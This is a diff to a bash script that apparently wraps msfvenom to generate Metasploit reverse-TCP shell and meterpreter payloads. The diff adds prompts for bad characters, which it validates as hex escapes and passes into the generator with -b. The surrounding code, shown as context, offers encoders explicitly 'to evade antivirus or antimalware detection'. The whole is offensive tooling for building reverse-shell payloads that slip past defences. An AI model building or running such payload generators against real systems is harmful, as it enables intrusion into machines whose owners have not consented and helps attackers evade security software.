@@ -250,6 +250,39 @@ case $enc_format in
 esac
 }
 
+check_bad_chars()
+{
+        echo "Please enter the bad characters."
+        read -r bad_char_check
+        encode_regex='^(\\x[a-f0-9]{2})+$'
+
+        if [[ $bad_char_check =~ $encode_regex ]];
+        then
+                off_bad_char="-b $bad_char_check"
+                echo $off_bad_char
+        else
+                echo "$bad_char_check is not a valid format for bad characters."
+                check_bad_chars
+        fi
+
+}
+
+bad_characters_question(){
+echo "Would you like to check for bad characters? Enter y for yes or n for no."
+read bad_char
+case $bad_char in
+        y)
+        check_bad_chars
+        ;;
+        n)
+        ;;
+        *)
+        echo "$bad_char is not one of the options."
+        bad_characters_question
+        ;;
+esac
+}
+
 #Asks user if they would like to encode payload and checks if user entry.
 encoder_question(){
 echo "${red}Would you like to use an encoder to evade antivirus or antimalware detection? Please indicate y for yes and n for no."
@@ -300,11 +333,11 @@ payload=""
 msfgen=""
 
 use_meterpreter() {
-	msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} --platform ${OS} ${arc_display} ${enc_format} $iteration -f $format"
+	msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} --platform ${OS} ${arc_display} -f $format ${off_bad_char} ${enc_format} ${iteration}"
 }
 
 no_meterpreter() {
-        msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} --platform ${OS} ${arc_display} ${enc_format} $iteration -f $format"
+        msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} --platform ${OS} ${arc_display} -f $format ${off_bad_char} ${enc_format} ${iteration}"
 }
 
 case  $meterpreter  in
